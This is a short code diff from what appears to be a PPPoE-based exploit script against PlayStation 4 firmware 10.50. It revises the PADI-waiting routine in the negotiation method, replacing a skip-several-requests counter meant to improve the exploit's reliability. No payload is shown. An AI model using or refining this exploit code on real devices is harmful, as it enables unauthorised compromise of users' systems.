@@ -259,17 +259,18 @@ class Exploit():
                              id=pkt[PPP_IPCP].id,
                              options=pkt[PPP_IPCP].options))
 
-    def ppp_negotation(self, cb=None, ignore_initial_reqs=False):
-        num_reqs_to_ignore = 6  # Ignore initial requests in order to increase the chances of the exploit to work
-                                # Tested from 6 to 8 requests, on version 10.50 - all give best results then not ignoring
-        num_ignored_reqs = 0
+    def ppp_negotation(self, cb=None, ignore_initial_req=False):
+        if ignore_initial_req:
+            print('[*] Waiting for PADI...')
+            while True:
+                pkt = self.s.recv()
+                if pkt and pkt.haslayer(
+                        PPPoED) and pkt[PPPoED].code == PPPOE_CODE_PADI:
+                    break
+
         print('[*] Waiting for PADI...')
         while True:
             pkt = self.s.recv()
-            if ignore_initial_reqs and (num_ignored_reqs < num_reqs_to_ignore):
-                print('[*] Ignoring initial PS4 PPoE request #{}..'.format(num_ignored_reqs+1))
-                num_ignored_reqs+=1
-                continue
             if pkt and pkt.haslayer(
                     PPPoED) and pkt[PPPoED].code == PPPOE_CODE_PADI:
                 break
